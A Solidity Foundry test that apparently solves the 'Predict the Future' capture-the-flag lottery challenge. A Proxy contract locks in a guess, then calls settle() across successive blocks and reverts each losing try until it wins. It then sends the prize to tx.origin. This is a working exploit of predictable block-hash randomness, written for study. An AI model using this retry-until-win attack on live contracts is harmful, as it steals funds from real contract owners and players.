// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {PredictTheFuture} from "../../src/lotteries/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    PredictTheFuture challenge;

    receive() external payable {}

    function setUp() public {
        vm.deal(address(this), 1 ether);
        challenge = new PredictTheFuture{value: 1 ether}();
    }

    function testKeepTrying() public {
        // % 10 means the answer falls in to range [0...9]
        // we can try settle many times until it succeed with our answer.
        vm.deal(address(this), 1 ether);
        uint8 answer = 0;
        Proxy proxy = new Proxy(challenge);
        uint256 blockNumber = block.number;
        proxy.lockInGuess{value: 1 ether}(answer);

        uint8 lastIndex = 0;
        for (uint8 i = 0; i < 256; i++) {
            vm.roll(blockNumber + 2 + i);
            try proxy.attack() {
                lastIndex = i + 1;
                break;
            } catch (bytes memory) /*lowLevelData*/ {
                // This is executed in case revert() was used.
            }
        }

        assertTrue(challenge.isComplete(), "not completed");
    }
}

contract Proxy {
    PredictTheFuture challenge;

    constructor(PredictTheFuture p) payable {
        challenge = p;
    }

    function lockInGuess(uint8 n) external payable {
        // need to call it from this contract because guesser is stored and checked
        // when settling
        challenge.lockInGuess{value: 1 ether}(n);
    }

    function attack() external payable {
        challenge.settle();

        // if we guessed wrong, revert
        require(challenge.isComplete(), "challenge not completed");
        // return all of it to EOA
        payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {}
}
